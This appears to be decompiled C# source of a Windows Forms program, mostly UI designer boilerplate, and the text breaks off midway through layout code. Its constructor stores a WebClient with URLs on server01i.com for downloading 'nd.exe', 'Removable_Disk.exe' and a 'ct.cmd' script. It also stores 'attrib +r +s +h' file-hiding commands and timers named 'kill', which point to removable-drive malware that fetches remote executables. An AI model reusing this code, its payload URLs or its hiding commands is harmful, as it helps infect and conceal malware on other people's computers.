using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

[DesignerGenerated]
public class ma : Form
{
	private static List<WeakReference> list_0 = new List<WeakReference>();

	private IContainer icontainer_0;

	[AccessedThroughProperty("lb_01")]
	private ListBox _lb_01;

	[AccessedThroughProperty("time_add")]
	private Timer timer_0;

	[AccessedThroughProperty("pb_add")]
	private ProgressBar _pb_add;

	[AccessedThroughProperty("txt_a1")]
	private Label _txt_a1;

	[AccessedThroughProperty("lb_02")]
	private ListBox _lb_02;

	[AccessedThroughProperty("txt_a2")]
	private Label _txt_a2;

	[AccessedThroughProperty("lb_03")]
	private ListBox _lb_03;

	[AccessedThroughProperty("txt_a3")]
	private Label _txt_a3;

	[AccessedThroughProperty("lb_04")]
	private ListBox _lb_04;

	[AccessedThroughProperty("txt_a4")]
	private Label _txt_a4;

	[AccessedThroughProperty("txt_a5")]
	private Label _txt_a5;

	[AccessedThroughProperty("lb_05")]
	private ListBox _lb_05;

	[AccessedThroughProperty("txt_a6")]
	private Label _txt_a6;

	[AccessedThroughProperty("lb_06")]
	private ListBox _lb_06;

	[AccessedThroughProperty("time_exper1")]
	private Timer timer_1;

	[AccessedThroughProperty("txt_a7")]
	private Label _txt_a7;

	[AccessedThroughProperty("lb_07")]
	private ListBox _lb_07;

	[AccessedThroughProperty("txt_a8")]
	private Label _txt_a8;

	[AccessedThroughProperty("lb_08")]
	private ListBox _lb_08;

	[AccessedThroughProperty("txt_a9")]
	private Label _txt_a9;

	[AccessedThroughProperty("lb_09")]
	private ListBox _lb_09;

	[AccessedThroughProperty("txt_a10")]
	private Label _txt_a10;

	[AccessedThroughProperty("lb_10")]
	private ListBox _lb_10;

	[AccessedThroughProperty("txt_a11")]
	private Label _txt_a11;

	[AccessedThroughProperty("lb_11")]
	private ListBox _lb_11;

	[AccessedThroughProperty("txt_a12")]
	private Label _txt_a12;

	[AccessedThroughProperty("lb_12")]
	private ListBox _lb_12;

	[AccessedThroughProperty("txt_a13")]
	private Label _txt_a13;

	[AccessedThroughProperty("lb_13")]
	private ListBox _lb_13;

	[AccessedThroughProperty("txt_a14")]
	private Label _txt_a14;

	[AccessedThroughProperty("lb_14")]
	private ListBox _lb_14;

	[AccessedThroughProperty("txt_a15")]
	private Label _txt_a15;

	[AccessedThroughProperty("lb_15")]
	private ListBox _lb_15;

	[AccessedThroughProperty("txt_a16")]
	private Label _txt_a16;

	[AccessedThroughProperty("lb_16")]
	private ListBox _lb_16;

	[AccessedThroughProperty("txt_a17")]
	private Label _txt_a17;

	[AccessedThroughProperty("lb_17")]
	private ListBox _lb_17;

	[AccessedThroughProperty("txt_a18")]
	private Label _txt_a18;

	[AccessedThroughProperty("lb_18")]
	private ListBox _lb_18;

	[AccessedThroughProperty("txt_a19")]
	private Label _txt_a19;

	[AccessedThroughProperty("lb_19")]
	private ListBox _lb_19;

	[AccessedThroughProperty("txt_a20")]
	private Label _txt_a20;

	[AccessedThroughProperty("lb_20")]
	private ListBox _lb_20;

	[AccessedThroughProperty("txt_a21")]
	private Label _txt_a21;

	[AccessedThroughProperty("lb_21")]
	private ListBox _lb_21;

	[AccessedThroughProperty("txt_a22")]
	private Label _txt_a22;

	[AccessedThroughProperty("lb_22")]
	private ListBox _lb_22;

	[AccessedThroughProperty("txt_a23")]
	private Label _txt_a23;

	[AccessedThroughProperty("lb_23")]
	private ListBox _lb_23;

	[AccessedThroughProperty("txt_a24")]
	private Label _txt_a24;

	[AccessedThroughProperty("lb_24")]
	private ListBox _lb_24;

	[AccessedThroughProperty("txt_a25")]
	private Label _txt_a25;

	[AccessedThroughProperty("lb_25")]
	private ListBox _lb_25;

	[AccessedThroughProperty("pb_exper1")]
	private ProgressBar _pb_exper1;

	[AccessedThroughProperty("time_kill")]
	private Timer timer_2;

	[AccessedThroughProperty("kill_one")]
	private Timer timer_3;

	private WebClient webClient_0;

	private string string_0;

	private string string_1;

	private string string_2;

	private string string_3;

	private string string_4;

	private string string_5;

	internal virtual ListBox lb_01
	{
		[DebuggerNonUserCode]
		get
		{
			return _lb_01;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lb_01 = value;
		}
	}

	internal virtual Timer Timer_0
	{
		[DebuggerNonUserCode]
		get
		{
			return timer_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer_0_Tick;
			if (timer_0 != null)
			{
				timer_0.remove_Tick(eventHandler);
			}
			timer_0 = value;
			if (timer_0 != null)
			{
				timer_0.add_Tick(eventHandler);
			}
		}
	}

	internal virtual ProgressBar pb_add
	{
		[DebuggerNonUserCode]
		get
		{
			return _pb_add;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_pb_add = value;
		}
	}

	internal virtual Label txt_a1
	{
		[DebuggerNonUserCode]
		get
		{
			return _txt_a1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txt_a1 = value;
		}
	}

	internal virtual ListBox lb_02
	{
		[DebuggerNonUserCode]
		get
		{
			return _lb_02;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lb_02 = value;
		}
	}

	internal virtual Label txt_a2
	{
		[DebuggerNonUserCode]
		get
		{
			return _txt_a2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txt_a2 = value;
		}
	}

	internal virtual ListBox lb_03
	{
		[DebuggerNonUserCode]
		get
		{
			return _lb_03;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lb_03 = value;
		}
	}

	internal virtual Label txt_a3
	{
		[DebuggerNonUserCode]
		get
		{
			return _txt_a3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txt_a3 = value;
		}
	}

	internal virtual ListBox lb_04
	{
		[DebuggerNonUserCode]
		get
		{
			return _lb_04;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lb_04 = value;
		}
	}

	internal virtual Label txt_a4
	{
		[DebuggerNonUserCode]
		get
		{
			return _txt_a4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txt_a4 = value;
		}
	}

	internal virtual Label txt_a5
	{
		[DebuggerNonUserCode]
		get
		{
			return _txt_a5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txt_a5 = value;
		}
	}

	internal virtual ListBox lb_05
	{
		[DebuggerNonUserCode]
		get
		{
			return _lb_05;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lb_05 = value;
		}
	}

	internal virtual Label txt_a6
	{
		[DebuggerNonUserCode]
		get
		{
			return _txt_a6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txt_a6 = value;
		}
	}

	internal virtual ListBox lb_06
	{
		[DebuggerNonUserCode]
		get
		{
			return _lb_06;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lb_06 = value;
		}
	}

	internal virtual Timer Timer_1
	{
		[DebuggerNonUserCode]
		get
		{
			return timer_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer_1_Tick;
			if (timer_1 != null)
			{
				timer_1.remove_Tick(eventHandler);
			}
			timer_1 = value;
			if (timer_1 != null)
			{
				timer_1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Label txt_a7
	{
		[DebuggerNonUserCode]
		get
		{
			return _txt_a7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txt_a7 = value;
		}
	}

	internal virtual ListBox lb_07
	{
		[DebuggerNonUserCode]
		get
		{
			return _lb_07;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lb_07 = value;
		}
	}

	internal virtual Label txt_a8
	{
		[DebuggerNonUserCode]
		get
		{
			return _txt_a8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txt_a8 = value;
		}
	}

	internal virtual ListBox lb_08
	{
		[DebuggerNonUserCode]
		get
		{
			return _lb_08;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lb_08 = value;
		}
	}

	internal virtual Label txt_a9
	{
		[DebuggerNonUserCode]
		get
		{
			return _txt_a9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txt_a9 = value;
		}
	}

	internal virtual ListBox lb_09
	{
		[DebuggerNonUserCode]
		get
		{
			return _lb_09;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lb_09 = value;
		}
	}

	internal virtual Label txt_a10
	{
		[DebuggerNonUserCode]
		get
		{
			return _txt_a10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txt_a10 = value;
		}
	}

	internal virtual ListBox lb_10
	{
		[DebuggerNonUserCode]
		get
		{
			return _lb_10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lb_10 = value;
		}
	}

	internal virtual Label txt_a11
	{
		[DebuggerNonUserCode]
		get
		{
			return _txt_a11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txt_a11 = value;
		}
	}

	internal virtual ListBox lb_11
	{
		[DebuggerNonUserCode]
		get
		{
			return _lb_11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lb_11 = value;
		}
	}

	internal virtual Label txt_a12
	{
		[DebuggerNonUserCode]
		get
		{
			return _txt_a12;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txt_a12 = value;
		}
	}

	internal virtual ListBox lb_12
	{
		[DebuggerNonUserCode]
		get
		{
			return _lb_12;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lb_12 = value;
		}
	}

	internal virtual Label txt_a13
	{
		[DebuggerNonUserCode]
		get
		{
			return _txt_a13;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txt_a13 = value;
		}
	}

	internal virtual ListBox lb_13
	{
		[DebuggerNonUserCode]
		get
		{
			return _lb_13;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lb_13 = value;
		}
	}

	internal virtual Label txt_a14
	{
		[DebuggerNonUserCode]
		get
		{
			return _txt_a14;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txt_a14 = value;
		}
	}

	internal virtual ListBox lb_14
	{
		[DebuggerNonUserCode]
		get
		{
			return _lb_14;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lb_14 = value;
		}
	}

	internal virtual Label txt_a15
	{
		[DebuggerNonUserCode]
		get
		{
			return _txt_a15;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txt_a15 = value;
		}
	}

	internal virtual ListBox lb_15
	{
		[DebuggerNonUserCode]
		get
		{
			return _lb_15;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lb_15 = value;
		}
	}

	internal virtual Label txt_a16
	{
		[DebuggerNonUserCode]
		get
		{
			return _txt_a16;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txt_a16 = value;
		}
	}

	internal virtual ListBox lb_16
	{
		[DebuggerNonUserCode]
		get
		{
			return _lb_16;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lb_16 = value;
		}
	}

	internal virtual Label txt_a17
	{
		[DebuggerNonUserCode]
		get
		{
			return _txt_a17;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txt_a17 = value;
		}
	}

	internal virtual ListBox lb_17
	{
		[DebuggerNonUserCode]
		get
		{
			return _lb_17;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lb_17 = value;
		}
	}

	internal virtual Label txt_a18
	{
		[DebuggerNonUserCode]
		get
		{
			return _txt_a18;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txt_a18 = value;
		}
	}

	internal virtual ListBox lb_18
	{
		[DebuggerNonUserCode]
		get
		{
			return _lb_18;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lb_18 = value;
		}
	}

	internal virtual Label txt_a19
	{
		[DebuggerNonUserCode]
		get
		{
			return _txt_a19;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txt_a19 = value;
		}
	}

	internal virtual ListBox lb_19
	{
		[DebuggerNonUserCode]
		get
		{
			return _lb_19;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lb_19 = value;
		}
	}

	internal virtual Label txt_a20
	{
		[DebuggerNonUserCode]
		get
		{
			return _txt_a20;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txt_a20 = value;
		}
	}

	internal virtual ListBox lb_20
	{
		[DebuggerNonUserCode]
		get
		{
			return _lb_20;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lb_20 = value;
		}
	}

	internal virtual Label txt_a21
	{
		[DebuggerNonUserCode]
		get
		{
			return _txt_a21;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txt_a21 = value;
		}
	}

	internal virtual ListBox lb_21
	{
		[DebuggerNonUserCode]
		get
		{
			return _lb_21;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lb_21 = value;
		}
	}

	internal virtual Label txt_a22
	{
		[DebuggerNonUserCode]
		get
		{
			return _txt_a22;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txt_a22 = value;
		}
	}

	internal virtual ListBox lb_22
	{
		[DebuggerNonUserCode]
		get
		{
			return _lb_22;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lb_22 = value;
		}
	}

	internal virtual Label txt_a23
	{
		[DebuggerNonUserCode]
		get
		{
			return _txt_a23;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txt_a23 = value;
		}
	}

	internal virtual ListBox lb_23
	{
		[DebuggerNonUserCode]
		get
		{
			return _lb_23;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lb_23 = value;
		}
	}

	internal virtual Label txt_a24
	{
		[DebuggerNonUserCode]
		get
		{
			return _txt_a24;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txt_a24 = value;
		}
	}

	internal virtual ListBox lb_24
	{
		[DebuggerNonUserCode]
		get
		{
			return _lb_24;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lb_24 = value;
		}
	}

	internal virtual Label txt_a25
	{
		[DebuggerNonUserCode]
		get
		{
			return _txt_a25;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txt_a25 = value;
		}
	}

	internal virtual ListBox lb_25
	{
		[DebuggerNonUserCode]
		get
		{
			return _lb_25;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lb_25 = value;
		}
	}

	internal virtual ProgressBar pb_exper1
	{
		[DebuggerNonUserCode]
		get
		{
			return _pb_exper1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_pb_exper1 = value;
		}
	}

	internal virtual Timer Timer_2
	{
		[DebuggerNonUserCode]
		get
		{
			return timer_2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer_2_Tick;
			if (timer_2 != null)
			{
				timer_2.remove_Tick(eventHandler);
			}
			timer_2 = value;
			if (timer_2 != null)
			{
				timer_2.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer_3
	{
		[DebuggerNonUserCode]
		get
		{
			return timer_3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer_3_Tick;
			if (timer_3 != null)
			{
				timer_3.remove_Tick(eventHandler);
			}
			timer_3 = value;
			if (timer_3 != null)
			{
				timer_3.add_Tick(eventHandler);
			}
		}
	}

	public ma()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		((Form)this).add_FormClosing(new FormClosingEventHandler(ma_FormClosing));
		((Form)this).add_Load((EventHandler)ma_Load);
		smethod_0(this);
		webClient_0 = new WebClient();
		string_0 = "http://server01i.com/dmall/ct.cmd";
		string_1 = "http://server01i.com/dmall/nd.exe";
		string_2 = "http://server01i.com/dmall/Removable_Disk.exe";
		string_3 = "..exe";
		string_4 = "attrib +r +s +h /d /s ";
		string_5 = "attrib -r -s -h /d /s ";
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void smethod_0(object object_0)
	{
		checked
		{
			lock (list_0)
			{
				if (list_0.Count == list_0.Capacity)
				{
					int num = 0;
					int num2 = list_0.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = list_0[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								list_0[num] = list_0[num3];
							}
							num++;
						}
						num3++;
					}
					list_0.RemoveRange(num, list_0.Count - num);
					list_0.Capacity = list_0.Count;
				}
				list_0.Add(new WeakReference(RuntimeHelpers.GetObjectValue(object_0)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && icontainer_0 != null) ? true : false)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Expected O, but got Unknown
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Expected O, but got Unknown
		//IL_00b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bc: Expected O, but got Unknown
		//IL_00bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c7: Expected O, but got Unknown
		//IL_00c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d2: Expected O, but got Unknown
		//IL_00d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dd: Expected O, but got Unknown
		//IL_00de: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e8: Expected O, but got Unknown
		//IL_00e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f3: Expected O, but got Unknown
		//IL_00f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fe: Expected O, but got Unknown
		//IL_00ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_0109: Expected O, but got Unknown
		//IL_010a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0114: Expected O, but got Unknown
		//IL_0115: Unknown result type (might be due to invalid IL or missing references)
		//IL_011f: Expected O, but got Unknown
		//IL_0120: Unknown result type (might be due to invalid IL or missing references)
		//IL_012a: Expected O, but got Unknown
		//IL_012b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0135: Expected O, but got Unknown
		//IL_0136: Unknown result type (might be due to invalid IL or missing references)
		//IL_0140: Expected O, but got Unknown
		//IL_0141: Unknown result type (might be due to invalid IL or missing references)
		//IL_014b: Expected O, but got Unknown
		//IL_014c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0156: Expected O, but got Unknown
		//IL_0157: Unknown result type (might be due to invalid IL or missing references)
		//IL_0161: Expected O, but got Unknown
		//IL_0162: Unknown result type (might be due to invalid IL or missing references)
		//IL_016c: Expected O, but got Unknown
		//IL_016d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0177: Expected O, but got Unknown
		//IL_0178: Unknown result type (might be due to invalid IL or missing references)
		//IL_0182: Expected O, but got Unknown
		//IL_0183: Unknown result type (might be due to invalid IL or missing references)
		//IL_018d: Expected O, but got Unknown
		//IL_018e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0198: Expected O, but got Unknown
		//IL_0199: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a3: Expected O, but got Unknown
		//IL_01a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ae: Expected O, but got Unknown
		//IL_01af: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b9: Expected O, but got Unknown
		//IL_01ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c4: Expected O, but got Unknown
		//IL_01c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01cf: Expected O, but got Unknown
		//IL_01d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_01da: Expected O, but got Unknown
		//IL_01db: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e5: Expected O, but got Unknown
		//IL_01e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f0: Expected O, but got Unknown
		//IL_01f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fb: Expected O, but got Unknown
		//IL_01fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0206: Expected O, but got Unknown
		//IL_0207: Unknown result type (might be due to invalid IL or missing references)
		//IL_0211: Expected O, but got Unknown
		//IL_0212: Unknown result type (might be due to invalid IL or missing references)
		//IL_021c: Expected O, but got Unknown
		//IL_021d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0227: Expected O, but got Unknown
		//IL_0228: Unknown result type (might be due to invalid IL or missing references)
		//IL_0232: Expected O, but got Unknown
		//IL_0233: Unknown result type (might be due to invalid IL or missing references)
		//IL_023d: Expected O, but got Unknown
		//IL_023e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0248: Expected O, but got Unknown
		//IL_0249: Unknown result type (might be due to invalid IL or missing references)
		//IL_0253: Expected O, but got Unknown
		//IL_0254: Unknown result type (might be due to invalid IL or missing references)
		//IL_025e: Expected O, but got Unknown
		//IL_025f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0269: Expected O, but got Unknown
		//IL_0270: Unknown result type (might be due to invalid IL or missing references)
		//IL_027a: Expected O, but got Unknown
		//IL_0281: Unknown result type (might be due to invalid IL or missing references)
		//IL_028b: Expected O, but got Unknown
		icontainer_0 = new Container();
		lb_01 = new ListBox();
		Timer_0 = new Timer(icontainer_0);
		pb_add = new ProgressBar();
		txt_a1 = new Label();
		lb_02 = new ListBox();
		txt_a2 = new Label();
		lb_03 = new ListBox();
		txt_a3 = new Label();
		lb_04 = new ListBox();
		txt_a4 = new Label();
		txt_a5 = new Label();
		lb_05 = new ListBox();
		txt_a6 = new Label();
		lb_06 = new ListBox();
		Timer_1 = new Timer(icontainer_0);
		txt_a7 = new Label();
		lb_07 = new ListBox();
		txt_a8 = new Label();
		lb_08 = new ListBox();
		txt_a9 = new Label();
		lb_09 = new ListBox();
		txt_a10 = new Label();
		lb_10 = new ListBox();
		txt_a11 = new Label();
		lb_11 = new ListBox();
		txt_a12 = new Label();
		lb_12 = new ListBox();
		txt_a13 = new Label();
		lb_13 = new ListBox();
		txt_a14 = new Label();
		lb_14 = new ListBox();
		txt_a15 = new Label();
		lb_15 = new ListBox();
		txt_a16 = new Label();
		lb_16 = new ListBox();
		txt_a17 = new Label();
		lb_17 = new ListBox();
		txt_a18 = new Label();
		lb_18 = new ListBox();
		txt_a19 = new Label();
		lb_19 = new ListBox();
		txt_a20 = new Label();
		lb_20 = new ListBox();
		txt_a21 = new Label();
		lb_21 = new ListBox();
		txt_a22 = new Label();
		lb_22 = new ListBox();
		txt_a23 = new Label();
		lb_23 = new ListBox();
		txt_a24 = new Label();
		lb_24 = new ListBox();
		txt_a25 = new Label();
		lb_25 = new ListBox();
		pb_exper1 = new ProgressBar();
		Timer_2 = new Timer(icontainer_0);
		Timer_3 = new Timer(icontainer_0);
		((Control)this).SuspendLayout();
		((ListControl)lb_01).set_FormattingEnabled(true);
		ListBox obj = lb_01;
		Point location = new Point(15, 66);
		((Control)obj).set_Location(location);
		((Control)lb_01).set_Name("lb_01");
		ListBox obj2 = lb_01;
		Size size = new Size(84, 95);
		((Control)obj2).set_Size(size);
		((Control)lb_01).set_TabIndex(0);
		Timer_0.set_Enabled(true);
		ProgressBar obj3 = pb_add;
		location = new Point(987, 36);
		((Control)obj3).set_Location(location);
		((Control)pb_add).set_Name("pb_add");
		ProgressBar obj4 = pb_add;
		size = new Size(100, 23);
		((Control)obj4).set_Size(size);
		((Control)pb_add).set_TabIndex(1);
		txt_a1.set_AutoSize(true);
		Label obj5 = txt_a1;
		location = new Point(12, 26);
		((Control)obj5).set_Location(location);
		((Control)txt_a1).set_Name("txt_a1");
		Label obj6 = txt_a1;
		size = new Size(39, 13);
		((Control)obj6).set_Size(size);
		((Control)txt_a1).set_TabIndex(2);
		txt_a1.set_Text("Label1");
		((ListControl)lb_02).set_FormattingEnabled(true);
		ListBox obj7 = lb_02;
		location = new Point(130, 66);
		((Control)obj7).set_Location(location);
		((Control)lb_02).set_Name("lb_02");
		ListBox obj8 = lb_02;
		size = new Size(98, 95);
		((Control)obj8).set_Size(size);
		((Control)lb_02).set_TabIndex(3);
		txt_a2.set_AutoSize(true);
		Label obj9 = txt_a2;
		location = new Point(127, 26);
		((Control)obj9).set_Location(location);
		((Control)txt_a2).set_Name("txt_a2");
		Label obj10 = txt_a2;
		size = new Size(39, 13);
		((Control)obj10).set_Size(size);
		((Control)txt_a2).set_TabIndex(4);
		txt_a2.set_Text("Label2");
		((ListControl)lb_03).set_FormattingEnabled(true);
		ListBox obj11 = lb_03;
		location = new Point(255, 66);
		((Control)obj11).set_Location(location);
		((Control)lb_03).set_Name("lb_03");
		ListBox obj12 = lb_03;
		size = new Size(98, 95);
		((Control)obj12).set_Size(size);
		((Control)lb_03).set_TabIndex(5);
		txt_a3.set_AutoSize(true);
		Label obj13 = txt_a3;
		location = new Point(252, 26);
		((Control)obj13).set_Location(location);
		((Control)txt_a3).set_Name("txt_a3");
		Label obj14 = txt_a3;
		size = new Size(39, 13);
		((Control)obj14).set_Size(size);
		((Control)txt_a3).set_TabIndex(6);
		txt_a3.set_Text("Label3");
		((ListControl)lb_04).set_FormattingEnabled(true);
		ListBox obj15 = lb_04;
		location = new Point(402, 66);
		((Control)obj15).set_Location(location);
		((Control)lb_04).set_Name("lb_04");
		ListBox obj16 = lb_04;
		size = new Size(98, 95);
		((Control)obj16).set_Size(size);
		((Control)lb_04).set_TabIndex(7);
		txt_a4.set_AutoSize(true);
		Label obj17 = txt_a4;
		location = new Point(399, 26);
		((Control)obj17).set_Location(location);
		((Control)txt_a4).set_Name("txt_a4");
		Label obj18 = txt_a4;
		size = new Size(39, 13);
		((Control)obj18).set_Size(size);
		((Control)txt_a4).set_TabIndex(8);
		txt_a4.set_Text("Label4");
		txt_a5.set_AutoSize(true);
		Label obj19 = txt_a5;
		location = new Point(529, 26);
		((Control)obj19).set_Location(location);
		((Control)txt_a5).set_Name("txt_a5");
